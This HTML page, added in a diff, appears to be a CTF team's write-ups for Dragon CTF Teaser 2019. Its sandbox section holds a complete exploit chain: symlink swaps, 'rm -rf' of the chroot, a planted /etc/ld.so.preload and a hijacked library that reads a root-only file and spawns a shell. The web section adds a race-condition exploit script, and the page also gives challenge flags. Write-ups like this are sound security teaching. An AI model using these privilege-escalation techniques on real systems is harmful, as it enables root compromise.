@@ -1,0 +1,537 @@
+<!DOCTYPE HTML>
+<!-- This page is modified from the template https://www.codeply.com/go/7XYosZ7VH5 by Carol Skelly (@iatek). -->
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <title>Dragon CTF Teaser 2019</title>
+    <link type="text/css" rel="stylesheet" href="../assets/css/github-markdown.css">
+    <link type="text/css" rel="stylesheet" href="../assets/css/pilcrow.css">
+    <link type="text/css" rel="stylesheet" href="../assets/css/hljs-github.min.css"/>
+    <link type="text/css" rel="stylesheet" href="../assets/css/bootstrap-4.0.0-beta.3.min.css">
+    <script type="text/javascript" src="../assets/js/jquery-3.3.1.slim.min.js"></script>
+    <script type="text/javascript" src="../assets/js/bootstrap-4.0.0-beta.3.min.js"></script>
+    <script type="text/javascript" src="../assets/js/popper-1.14.3.min.js"></script>
+    <script type="text/javascript" src="../assets/js/mathjax-2.7.4/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+  </head>
+  <style>
+  body {
+      padding-top: 56px;
+  }
+
+  .sticky-offset {
+      top: 56px;
+  }
+
+  #body-row {
+      margin-left:0;
+      margin-right:0;
+  }
+  #sidebar-container {
+      min-height: 100vh;   
+      background-color: #333;
+      padding: 0;
+  }
+
+  /* Sidebar sizes when expanded and expanded */
+  .sidebar-expanded {
+      width: 230px;
+  }
+  .sidebar-collapsed {
+      width: 60px;
+  }
+
+  /* Menu item*/
+  #sidebar-container .list-group a {
+      height: 50px;
+      color: white;
+  }
+
+  /* Submenu item*/
+  #sidebar-container .list-group .sidebar-submenu a {
+      height: 45px;
+      padding-left: 60px;
+  }
+  .sidebar-submenu {
+      font-size: 0.9rem;
+  }
+
+  /* Separators */
+  .sidebar-separator-title {
+      background-color: #333;
+      height: 35px;
+  }
+  .sidebar-separator {
+      background-color: #333;
+      height: 25px;
+  }
+  .logo-separator {
+      background-color: #333;    
+      height: 60px;
+  }
+
+
+  /* 
+   active scrollspy
+  */
+  .list-group-item.active {
+    border-color: transparent;
+    border-left: #e69138 solid 4px;
+  }
+
+  /* 
+   anchor padding top
+   https://stackoverflow.com/a/28824157
+  */
+  :target:before {
+    content:"";
+    display:block;
+    height:56px; /* fixed header height*/
+    margin:-56px 0 0; /* negative fixed header height */
+  }
+  </style>
+  
+  <script>
+  // https://stackoverflow.com/a/48330533
+  $(window).on('activate.bs.scrollspy', function (event) {
+    let active_collapse = $($('.list-group-item.active').parents()[0]);
+    $(".collapse").removeClass("show");
+    active_collapse.addClass("show");
+
+    let parent_menu = $('a[href="#' + active_collapse[0].id + '"]');
+    $('a[href^="#submenu"]').css("border-left", "");
+    parent_menu.css("border-left","#e69138 solid 4px");
+  });
+
+  // http://docs.mathjax.org/en/latest/tex.html#tex-and-latex-math-delimiters
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [['$','$'], ['\\(','\\)']],
+      processEscapes: true
+    }
+  });
+  </script>
+
+  <body style="position: relative;" data-spy="scroll" data-target=".sidebar-submenu" data-offset="70">
+    <nav class="navbar navbar-expand-md navbar-light bg-light fixed-top">
+      <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarNavDropdown" aria-controls="navbarNavDropdown" aria-expanded="false" aria-label="Toggle navigation">
+        <span class="navbar-toggler-icon"></span>
+      </button>
+      <a class="navbar-brand" href="https://github.com/balsn/ctf_writeup">
+        <img src="https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png" class="d-inline-block align-top" alt="" width="30" height="30">
+        <span class="menu-collapsed">balsn / ctf_writeup</span>
+      </a>
+      <div class="collapse navbar-collapse" id="navbarNavDropdown">
+        <ul class="navbar-nav my-2 my-lg-0">
+            
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=watch&count=true&size=large&v=2" frameborder="0" scrolling="0" width="140px" height="30px"></iframe>
+              <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=star&count=true&size=large" frameborder="0" scrolling="0" width="140px" height="30px"></iframe>
+        
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                sandbox
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#trusted-loading-1">trusted-loading-1</a>
+    
+                <a class="dropdown-item" href="#trusted-loading-2">trusted-loading-2</a>
+    
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                web
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#rms">rms</a>
+    
+                <a class="dropdown-item" href="#rms-fixed">rms-fixed</a>
+    
+                <a class="dropdown-item" href="#looking-glass">looking-glass</a>
+    
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                misc
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#playcap-(unsolved)">playcap-(unsolved)</a>
+    
+                <a class="dropdown-item" href="#babypdf">babypdf</a>
+    
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                crypto
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#rsachained">rsachained</a>
+    
+              </div>
+            </li>
+    
+        </ul>
+      </div>
+      <div class="navbar-collapse collapse w-100 order-3 dual-collapse2">
+        <ul class="navbar-nav ml-auto">
+          <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=watch&count=true&size=large&v=2" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
+          <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=star&count=true&size=large" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
+        </ul>
+      </div>
+    </nav>
+    <div class="row" id="body-row">
+      <div id="sidebar-container" class="sidebar-expanded d-none d-md-block col-2">
+        <ul class="list-group sticky-top sticky-offset">
+          
+          <a href="#submenu0" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">sandbox</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu0" class="collapse sidebar-submenu">
+            <a href="#trusted-loading-1" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">trusted-loading-1</span>
+            </a>
+    
+<a href="#trusted-loading-2" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">trusted-loading-2</span>
+            </a>
+    
+          </div>
+    
+          <a href="#submenu1" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">web</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu1" class="collapse sidebar-submenu">
+            <a href="#rms" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">rms</span>
+            </a>
+    
+<a href="#rms-fixed" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">rms-fixed</span>
+            </a>
+    
+<a href="#looking-glass" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">looking-glass</span>
+            </a>
+    
+          </div>
+    
+          <a href="#submenu2" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">misc</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu2" class="collapse sidebar-submenu">
+            <a href="#playcap-(unsolved)" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">playcap-(unsolved)</span>
+            </a>
+    
+<a href="#babypdf" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">babypdf</span>
+            </a>
+    
+          </div>
+    
+          <a href="#submenu3" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">crypto</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu3" class="collapse sidebar-submenu">
+            <a href="#rsachained" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">rsachained</span>
+            </a>
+    
+          </div>
+    
+        </ul>
+      </div>
+      <div class="col-10 py-3">
+        <article class="markdown-body"><h1 id="dragon-ctf-teaser-2019"><a class="header-link" href="#dragon-ctf-teaser-2019"></a>Dragon CTF Teaser 2019</h1>
+
+<h2 id="sandbox"><a class="header-link" href="#sandbox"></a>Sandbox</h2>
+<h3 id="trusted-loading-1"><a class="header-link" href="#trusted-loading-1"></a>Trusted Loading 1</h3>
+<p>We can execute any binary under the chroot(&quot;/home/chall/chroot&quot;). We also can call trusted_loader to execute binary not under the chroot if that binary pass the signature check. The bug is at when trusted_loader check the file using stat with S_ISREG. If we provide a symlink, S_ISREG will also return True. We first let the symlink link to the &quot;tester&quot; to pass the signature check. Before trusted_loader execute the binary, we rename the binary which we want to execute to &quot;tester&quot;. In the end, we can execute any binary not under the chroot to read &quot;/flag1&quot;. </p>
+<h3 id="trusted-loading-2"><a class="header-link" href="#trusted-loading-2"></a>Trusted Loading 2</h3>
+<p>In this challenge, we have to read the &quot;/flag2&quot; which is only read by root. We found that we can upload file to the &quot;/home/chall/chroot&quot;. This process is done by root privilege. &quot;/home/chall&quot; is owned by 1337, so we can delete &quot;/home/chall/chroot&quot; and make it as a symlink to any path. It means that we can create any file in any path. We create /etc/ld.so.preload and exit. When executing poweroff, it will preload our library. We hijack getopt_long to read the flag2.</p>
+<pre class="hljs"><code><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Upload</span><span class="hljs-params">(filename,name)</span>:</span>
+    data = open(filename).read()
+    r.sendlineafter(<span class="hljs-string">"3."</span>,<span class="hljs-string">"2"</span>)
+    r.sendlineafter(<span class="hljs-string">"?"</span>,name)
+    r.sendlineafter(<span class="hljs-string">"?"</span>,str(len(data)))
+    r.sendafter(<span class="hljs-string">"?"</span>,data)
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Do_elf</span><span class="hljs-params">(filename)</span>:</span>
+    data = open(filename).read()
+    r.sendlineafter(<span class="hljs-string">"3."</span>,<span class="hljs-string">"1"</span>)
+    r.sendlineafter(<span class="hljs-string">"?"</span>,str(len(data)))
+    r.sendafter(<span class="hljs-string">"?"</span>,data)
+<span class="hljs-string">'''
+init.c
+#include &lt;stdio.h&gt;
+#include &lt;sys/ptrace.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;unistd.h&gt;
+int main(){
+        symlink("/home/chall/chroot/tester","PWN");
+        symlink("/home/chall/chroot/tester.sig","PWN.sig");
+        while(1) {
+                sleep(1);
+        }
+
+}
+
+exp.c
+int main(){
+        system("rm -rf ../chroot");
+        system("ln -s /etc ../chroot");
+        puts("Done");
+        puts("3.");
+        sleep(1);
+
+}
+
+sandbox.c
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+int main(){
+        write(666,"\x01PWN",4);
+        sleep(1);
+        rename("exp","tester");
+}
+
+libx.c
+int getopt_long(){
+        printf("My id : %d\n",getuid());
+        int fd = open("/flag2",0);
+        char buf[0x100];
+        write(1,buf,read(fd,buf,0x100));
+        unlink("/etc/libx.so");
+        system("sh");
+        return 0;
+}
+
+ld.so.preload
+libx.so
+'''</span>
+
+
+r = remote(<span class="hljs-string">"trustedloading.hackable.software"</span>, <span class="hljs-number">1337</span>)
+r.recvuntil(<span class="hljs-string">": "</span>)
+s = process(r.recvline()[:<span class="hljs-number">-1</span>].split())
+s.recvuntil(<span class="hljs-string">": "</span>)
+r.send(s.recvall())
+s.close()
+
+<span class="hljs-comment">#r = process('./start.sh')</span>
+
+data = open(<span class="hljs-string">"init"</span>).read()
+r.sendlineafter(<span class="hljs-string">"?"</span>,str(len(data)))
+r.sendafter(<span class="hljs-string">"?"</span>,data)
+Upload(<span class="hljs-string">"tester"</span>,<span class="hljs-string">"tester"</span>)
+Upload(<span class="hljs-string">"tester.sig"</span>,<span class="hljs-string">"tester.sig"</span>)
+Upload(<span class="hljs-string">"exp"</span>,<span class="hljs-string">"exp"</span>)
+context.arch = <span class="hljs-string">"amd64"</span>
+Do_elf(<span class="hljs-string">"sandbox"</span>)
+r.recvuntil(<span class="hljs-string">"Done"</span>);
+Upload(<span class="hljs-string">"ld.so.preload"</span>,<span class="hljs-string">"ld.so.preload"</span>)
+Upload(<span class="hljs-string">"libx.so"</span>,<span class="hljs-string">"libx.so"</span>)
+r.sendlineafter(<span class="hljs-string">"3."</span>,<span class="hljs-string">"3"</span>)
+r.interactive()</code></pre><h2 id="web"><a class="header-link" href="#web"></a>Web</h2>
+<h3 id="rms"><a class="header-link" href="#rms"></a>rms</h3>
+<ul class="list">
+<li>The program didn&#39;t check IPv4 <code>0.0.0.0</code>.</li>
+<li><code>http://0:8000/flag</code></li>
+<li><code>DrgnS{350aa97f27f497f7bc13}</code></li>
+</ul>
+<h3 id="rms-fixed"><a class="header-link" href="#rms-fixed"></a>rms-fixed</h3>
+<ul class="list">
+<li><code>man gehostbyname</code>: `The functions gethostbyname() and gethostbyaddr() may  return  pointers to  static  data, which may be overwritten by later calls.</li>
+<li>Set up a domain with AAAA record.</li>
+<li>Race condition on ipv4 sockaddr.</li>
+</ul>
+<pre class="hljs"><code><span class="hljs-comment">#!/usr/bin/env python</span>
+<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+
+<span class="hljs-string">'''
+HTTP/1.0 200 OK
+Server: BaseHTTP/0.3 Python/2.7.15+
+Date: Sun, 22 Sep 2019 13:10:31 GMT
+
+DrgnS{e9759caf4f2d2b69773c}
+
+'''</span>
+
+y = remote( <span class="hljs-string">'rms-fixed.hackable.software'</span> , <span class="hljs-number">1337</span> )
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">( url )</span>:</span>
+    y.sendlineafter( <span class="hljs-string">'[pfvaq]'</span> , <span class="hljs-string">'a'</span> )
+    y.sendlineafter( <span class="hljs-string">'url?'</span> , url )
+
+add( <span class="hljs-string">'http://domain:8000/flag'</span> ) <span class="hljs-comment"># domain with AAAA record</span>
+
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range( <span class="hljs-number">0x10</span> ):
+    add( <span class="hljs-string">'http://127.0.0.1'</span> )
+
+y.sendlineafter( <span class="hljs-string">'[pfvaq]'</span> , <span class="hljs-string">'v 0'</span> )
+
+y.interactive()</code></pre><h3 id="looking-glass"><a class="header-link" href="#looking-glass"></a>looking glass</h3>
+<p>In this task, we can send a protobuf to server, the server will check the input won&#39;t cause commandline injection and execute it.
+However, the validator also has a md5 cache.</p>
+<p>The vulnerability is obvious: craft a good/evil pair of payload with same md5.</p>
+<p>The first method I tried is chosen prefix collision: Create two payload and add some dummy bytes after to make md5 collision.
+However, the input length is limited to 4 blocks. It&#39;s computation complexity is about 2^50.
+It may be feasible using a single GPU machine, but I solved it in another way before my GPU found the collision.</p>
+<p>There&#39;s a weaker version of collision attack on md5 called <code>Unicoll</code>, we can control the prefix and it also has a predictable difference (e.g. +1), 
+so we can create blocks like:</p>
+<pre class="hljs"><code><span class="hljs-function"><span class="hljs-title">aaaaaaaaaaaa</span></span>...
+<span class="hljs-function"><span class="hljs-title">aaaaaaaaabaa</span></span>...</code></pre><p>In protobuf, we have a <code>Length-delimited</code> type:</p>
+<pre class="hljs"><code>[id | type] [length] [data]</code></pre><p>Combine these things together, we can create a pair of payload where the length has one byte difference.
+And my final payload looks like:</p>
+<pre class="hljs"><code><span class="hljs-selector-tag">Evil</span> <span class="hljs-selector-tag">one</span>:
+(<span class="hljs-selector-tag">evil</span> <span class="hljs-selector-tag">payload</span>) (<span class="hljs-selector-attr">[dummyID]</span> <span class="hljs-selector-attr">[ n ]</span> <span class="hljs-selector-attr">[collision ...]</span>) (<span class="hljs-selector-attr">[dummyID]</span>    <span class="hljs-selector-attr">[dummyID]</span> <span class="hljs-selector-attr">[0   [addressID]</span> 7 "8<span class="hljs-selector-class">.8</span><span class="hljs-selector-class">.8</span><span class="hljs-selector-class">.8</span>"   <span class="hljs-selector-attr">[pad]</span>])
+
+<span class="hljs-selector-tag">Good</span> <span class="hljs-selector-tag">one</span>:
+(<span class="hljs-selector-tag">evil</span> <span class="hljs-selector-tag">payload</span>) (<span class="hljs-selector-attr">[dummyID]</span> <span class="hljs-selector-attr">[n+1]</span> <span class="hljs-selector-attr">[collision ...    [dummyID]</span>]) (<span class="hljs-selector-attr">[dummyID]</span>  0) (<span class="hljs-selector-attr">[addressID]</span> 7 "8<span class="hljs-selector-class">.8</span><span class="hljs-selector-class">.8</span><span class="hljs-selector-class">.8</span>") (<span class="hljs-selector-attr">[pad]</span>)</code></pre><h2 id="misc"><a class="header-link" href="#misc"></a>Misc</h2>
+<h3 id="playcap-(unsolved)"><a class="header-link" href="#playcap-(unsolved)"></a>PlayCAP (unsolved)</h3>
+<p>This challenge was solved 30 minutes after the CTF ended, because I didn&#39;t notice the time lol.</p>
+<p><a href="https://github.com/gynvael/random-stuff/tree/master/teaser_dragon_ctf_2019/playcap">Official repo</a></p>
+<p>The PCAP contains USB data of a controller talking to the HTML5 controller API. However. ot&#39;s hard to find the USB spec of Nintendo Switch controller. The only information I found is <a href="https://github.com/dekuNukem/Nintendo_Switch_Reverse_Engineering/issues/7">this</a>, though I don&#39;t think it&#39;s useful.</p>
+<p>Then, in the HTML page, I found there were only 5 keys. Maybe we can directly observe bits in packets to determine the corresponding key. I write a simple Python script to analyze the bits distribution:</p>
+<p>First, filter the USB packets with leftover data.</p>
+<pre class="hljs"><code>$ tshark -r PlayCAP<span class="hljs-selector-class">.pcapng</span> -T fields -e usb.capdata</code></pre><p>Then compute the distrubition of each bits in USB leftover data.</p>
+<pre class="hljs"><code><span class="hljs-function"><span class="hljs-title">Counter</span><span class="hljs-params">({<span class="hljs-string">'0'</span>: <span class="hljs-number">4720</span>, <span class="hljs-string">'1'</span>: <span class="hljs-number">259</span>})</span></span> <span class="hljs-comment">// reset? confirm?</span>
+<span class="hljs-function"><span class="hljs-title">Counter</span><span class="hljs-params">({<span class="hljs-string">'0'</span>: <span class="hljs-number">4979</span>})</span></span>
+<span class="hljs-function"><span class="hljs-title">Counter</span><span class="hljs-params">({<span class="hljs-string">'0'</span>: <span class="hljs-number">4918</span>, <span class="hljs-string">'1'</span>: <span class="hljs-number">61</span>})</span></span>  <span class="hljs-comment">// confirm? reset?</span>
+<span class="hljs-function"><span class="hljs-title">Counter</span><span class="hljs-params">({<span class="hljs-string">'0'</span>: <span class="hljs-number">4979</span>})</span></span>
+<span class="hljs-function"><span class="hljs-title">Counter</span><span class="hljs-params">({<span class="hljs-string">'1'</span>: <span class="hljs-number">4979</span>})</span></span>
+<span class="hljs-function"><span class="hljs-title">Counter</span><span class="hljs-params">({<span class="hljs-string">'0'</span>: <span class="hljs-number">4979</span>})</span></span>
+<span class="hljs-function"><span class="hljs-title">Counter</span><span class="hljs-params">({<span class="hljs-string">'0'</span>: <span class="hljs-number">4979</span>})</span></span>
+<span class="hljs-function"><span class="hljs-title">Counter</span><span class="hljs-params">({<span class="hljs-string">'0'</span>: <span class="hljs-number">4979</span>})</span></span>
+<span class="hljs-function"><span class="hljs-title">Counter</span><span class="hljs-params">({<span class="hljs-string">'0'</span>: <span class="hljs-number">4979</span>})</span></span>
+<span class="hljs-function"><span class="hljs-title">Counter</span><span class="hljs-params">({<span class="hljs-string">'0'</span>: <span class="hljs-number">4979</span>})</span></span>
+<span class="hljs-function"><span class="hljs-title">Counter</span><span class="hljs-params">({<span class="hljs-string">'0'</span>: <span class="hljs-number">4979</span>})</span></span>
+<span class="hljs-function"><span class="hljs-title">Counter</span><span class="hljs-params">({<span class="hljs-string">'0'</span>: <span class="hljs-number">4979</span>})</span></span>
+<span class="hljs-function"><span class="hljs-title">Counter</span><span class="hljs-params">({<span class="hljs-string">'0'</span>: <span class="hljs-number">4979</span>})</span></span>
+<span class="hljs-function"><span class="hljs-title">Counter</span><span class="hljs-params">({<span class="hljs-string">'0'</span>: <span class="hljs-number">4979</span>})</span></span>
+<span class="hljs-function"><span class="hljs-title">Counter</span><span class="hljs-params">({<span class="hljs-string">'0'</span>: <span class="hljs-number">4979</span>})</span></span>
+<span class="hljs-function"><span class="hljs-title">Counter</span><span class="hljs-params">({<span class="hljs-string">'0'</span>: <span class="hljs-number">4979</span>})</span></span>
+<span class="hljs-function"><span class="hljs-title">Counter</span><span class="hljs-params">({<span class="hljs-string">'0'</span>: <span class="hljs-number">4830</span>, <span class="hljs-string">'1'</span>: <span class="hljs-number">149</span>})</span></span> <span class="hljs-comment">// direction pads?</span>
+<span class="hljs-function"><span class="hljs-title">Counter</span><span class="hljs-params">({<span class="hljs-string">'0'</span>: <span class="hljs-number">4606</span>, <span class="hljs-string">'1'</span>: <span class="hljs-number">373</span>})</span></span> <span class="hljs-comment">// direction pads?</span>
+<span class="hljs-function"><span class="hljs-title">Counter</span><span class="hljs-params">({<span class="hljs-string">'0'</span>: <span class="hljs-number">4842</span>, <span class="hljs-string">'1'</span>: <span class="hljs-number">137</span>})</span></span> <span class="hljs-comment">// direction pads?</span>
+<span class="hljs-function"><span class="hljs-title">Counter</span><span class="hljs-params">({<span class="hljs-string">'0'</span>: <span class="hljs-number">4794</span>, <span class="hljs-string">'1'</span>: <span class="hljs-number">185</span>})</span></span> <span class="hljs-comment">// direction pads?</span>
+...
+<span class="hljs-function"><span class="hljs-title">Counter</span><span class="hljs-params">({<span class="hljs-string">'0'</span>: <span class="hljs-number">2364</span>, <span class="hljs-string">'1'</span>: <span class="hljs-number">23</span>XX})</span></span></code></pre><p>Because the button usually works like this: if it&#39;s pressed, it will remain 1 for a few microseconds. Once it&#39;s released it will become 0. Based on this assumption, we can make a good guess. I&#39;ve marked those bits in the code above.</p>
+<p>The rest is just recovering the button.</p>
+<pre class="hljs"><code><span class="hljs-comment">#!/usr/bin/env python3</span>
+<span class="hljs-keyword">from</span> collections <span class="hljs-keyword">import</span> Counter
+<span class="hljs-keyword">from</span> itertools <span class="hljs-keyword">import</span> permutations
+
+board = <span class="hljs-string">'''ABCDEFGHIJ
+KLMNOPQRST
+UVWXYZabcd
+efghijklmn
+opqrstuvwx
+yz.,-=:;{}'''</span>.split(<span class="hljs-string">'\n'</span>)
+
+<span class="hljs-comment"># wirhshark: filter "usb.src == 1.8.1" and save as filtered.pcapng</span>
+<span class="hljs-comment"># tshark -r filtered.pcapng -T fields -e usb.capdata  &gt; data</span>
+
+lines = [bin(int(line[<span class="hljs-number">0</span>:<span class="hljs-number">24</span>],<span class="hljs-number">16</span>))[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">24</span>*<span class="hljs-number">8</span>) <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> open(<span class="hljs-string">'data'</span>).read().splitlines() <span class="hljs-keyword">if</span> line != <span class="hljs-string">''</span>]
+ops = [i[<span class="hljs-number">124</span>]+i[<span class="hljs-number">126</span>]+i[<span class="hljs-number">140</span>:<span class="hljs-number">144</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> lines]
+
+dir_map = {dir_op_code:dxdy <span class="hljs-keyword">for</span> dir_op_code, dxdy <span class="hljs-keyword">in</span> zip([<span class="hljs-string">'1000'</span>, <span class="hljs-string">'0100'</span>, <span class="hljs-string">'0010'</span>, <span class="hljs-string">'0001'</span>], [
+   <span class="hljs-comment">#(y, x)</span>
+    ( <span class="hljs-number">0</span>, <span class="hljs-number">-1</span>), <span class="hljs-comment"># left</span>
+    ( <span class="hljs-number">0</span>, +<span class="hljs-number">1</span>), <span class="hljs-comment"># right</span>
+    (<span class="hljs-number">-1</span>,  <span class="hljs-number">0</span>), <span class="hljs-comment"># up</span>
+    (+<span class="hljs-number">1</span>,  <span class="hljs-number">0</span>), <span class="hljs-comment"># down</span>
+])}
+flag = <span class="hljs-string">''</span>
+last_op = <span class="hljs-string">'111111'</span>
+last_cnt = <span class="hljs-number">0</span>
+pos = (<span class="hljs-number">0</span>, <span class="hljs-number">0</span>)
+<span class="hljs-keyword">for</span> op <span class="hljs-keyword">in</span> ops[<span class="hljs-number">3</span>:]:
+    <span class="hljs-keyword">if</span> op == last_op:
+        last_cnt += <span class="hljs-number">1</span>
+        <span class="hljs-keyword">continue</span>
+    <span class="hljs-keyword">if</span> op == <span class="hljs-string">'000000'</span>:
+        print(last_cnt)
+        last_op = op
+        last_cnt = <span class="hljs-number">0</span>
+        <span class="hljs-keyword">continue</span>
+    <span class="hljs-keyword">assert</span> last_op == <span class="hljs-string">'000000'</span>
+    <span class="hljs-keyword">assert</span> op.count(<span class="hljs-string">'1'</span>) == <span class="hljs-number">1</span>
+    last_op = op
+    y, x = pos
+    confirm, reset, direction = op[<span class="hljs-number">0</span>], op[<span class="hljs-number">1</span>], op[<span class="hljs-number">2</span>:]
+    <span class="hljs-keyword">if</span> confirm == <span class="hljs-string">'1'</span>:
+        print(<span class="hljs-string">'confirm'</span>, end=<span class="hljs-string">', '</span>)
+        flag += board[y][x]
+    <span class="hljs-keyword">elif</span> reset == <span class="hljs-string">'1'</span>:
+        print(<span class="hljs-string">'reset'</span>, end=<span class="hljs-string">', '</span>)
+        pos = (<span class="hljs-number">0</span>, <span class="hljs-number">0</span>)
+    <span class="hljs-keyword">else</span>:
+        print(<span class="hljs-string">'dir'</span>, direction, end=<span class="hljs-string">', '</span>)
+        dy, dx = dir_map[direction]
+        pos = ((y+dy) % len(board), (x+dx) % len(board[<span class="hljs-number">0</span>]))
+print(flag)</code></pre><p>The flag: <code>DrgnS{LetsPlayAGamepad}</code></p>
+<h3 id="babypdf"><a class="header-link" href="#babypdf"></a>babyPDF</h3>
+<ul class="list">
+<li>Use zlib to extract pdj obj stream.</li>
+<li>Remove <code>/Filter /FlateDecode</code>.</li>
+<li>Change the color to black: <code>0 0 0 rg /a0 gs</code>.
+<img src="https://i.imgur.com/SiTw5FM.png" alt=""></li>
+</ul>
+<h2 id="crypto"><a class="header-link" href="#crypto"></a>Crypto</h2>
+<h3 id="rsachained"><a class="header-link" href="#rsachained"></a>rsachained</h3>
+<p>In this task, we got 4 different variants of RSA:</p>
+<pre class="hljs"><code><span class="hljs-symbol">N1</span> = <span class="hljs-built_in">p1</span> * <span class="hljs-built_in">q1</span>        (p <span class="hljs-number">700</span> <span class="hljs-keyword">bits, </span>q <span class="hljs-number">1400</span> <span class="hljs-keyword">bits)
+</span><span class="hljs-symbol">N2</span> = <span class="hljs-built_in">p2</span> * <span class="hljs-built_in">q2</span> * r    (p <span class="hljs-number">700</span> <span class="hljs-keyword">bits, </span>q <span class="hljs-number">700</span> <span class="hljs-keyword">bits, </span>r <span class="hljs-number">700</span> <span class="hljs-keyword">bits)
+</span><span class="hljs-symbol">N3</span> = <span class="hljs-built_in">p3</span> * <span class="hljs-built_in">q3</span> * r    (p <span class="hljs-number">700</span> <span class="hljs-keyword">bits, </span>q <span class="hljs-number">700</span> <span class="hljs-keyword">bits, </span>r <span class="hljs-number">700</span> <span class="hljs-keyword">bits)
+</span><span class="hljs-symbol">N4</span> = <span class="hljs-built_in">p4</span> * <span class="hljs-built_in">q4</span> * <span class="hljs-built_in">q4</span>   (p <span class="hljs-number">700</span> <span class="hljs-keyword">bits, </span>q <span class="hljs-number">700</span> <span class="hljs-keyword">bits)</span></code></pre><p>And we have <code>N</code> and lower 1050 bits of <code>d</code>, which is defined as:</p>
+<pre class="hljs"><code><span class="hljs-attr">e</span> = <span class="hljs-number">1667</span>
+<span class="hljs-attr">d</span> = inverse(e, phi(N))</code></pre><p>To solve the first one, we can use the method described in <a href="https://link.springer.com/content/pdf/10.1007%2F3-540-49649-1_3.pdf">this paper</a>.</p>
+<pre class="hljs"><code>e * d = <span class="hljs-number">1</span> (<span class="hljs-built_in">mod</span> <span class="hljs-built_in">phi</span>(<span class="hljs-built_in">N</span>))
+e * d = k * <span class="hljs-built_in">phi</span>(<span class="hljs-built_in">N</span>) + <span class="hljs-number">1</span>
+d &lt; <span class="hljs-built_in">phi</span>(<span class="hljs-built_in">N</span>) =&gt; k &lt; e
+
+s = p + q
+<span class="hljs-built_in">phi</span>(<span class="hljs-built_in">N</span>) = (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>) = <span class="hljs-built_in">N</span> − s + <span class="hljs-number">1</span>
+
